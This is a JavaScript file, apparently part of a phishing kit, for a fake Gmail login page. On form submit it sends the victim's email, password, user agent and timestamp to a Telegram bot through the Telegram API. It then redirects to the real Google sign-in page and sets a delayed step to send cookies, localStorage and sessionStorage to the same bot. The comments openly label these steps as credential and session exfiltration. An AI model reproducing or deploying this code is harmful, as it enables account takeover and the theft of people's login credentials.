// sharpshooter/script.js

document.getElementById("gmail-login").addEventListener("submit", async function(e) {
  e.preventDefault();

  const formData = new FormData(this);
  const creds = {
    email: formData.get("email"),
    password: formData.get("password"),
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };

  try {
    // Step 1: Send credentials to Telegram webhook
    const resCred = await fetch(`https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "<YOUR_CHAT_ID>",
        text: `📧 Gmail Login:\n\n📧 Email: ${creds.email}\n🔑 Pass: ${creds.password}\n🌐 Agent: ${creds.userAgent}\n⏳ Time: ${creds.timestamp}`
      })
    });

    if (!resCred.ok) throw new Error("Failed to send credentials");

    // Step 2: Redirect to real Google Sign-in Page
    window.location.href = "https://accounts.google.com/signin";

    // STEP 3: Collect cookies/storage AFTER redirection completes
    setTimeout(async () => {
      try {
        const sessionData = {
          cookies: document.cookie || "",
          ls: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
          ss: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))
        };

        const resSession = await fetch(`https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "<YOUR_CHAT_ID>",
            text: `🍪 Gmail Session Captured:\n${JSON.stringify(sessionData, null, 2)}`
          })
        });

        if (!resSession.ok) throw new Error("Session exfil failed");

      } catch (err) {
        console.error("[Session Exfil ERROR]:", err.message);
      }

    }, 3500); // Wait 3.5 seconds for login redirection

  } catch (err) {
    console.error("[Credential Exfil ERROR]:", err.message);
  }
});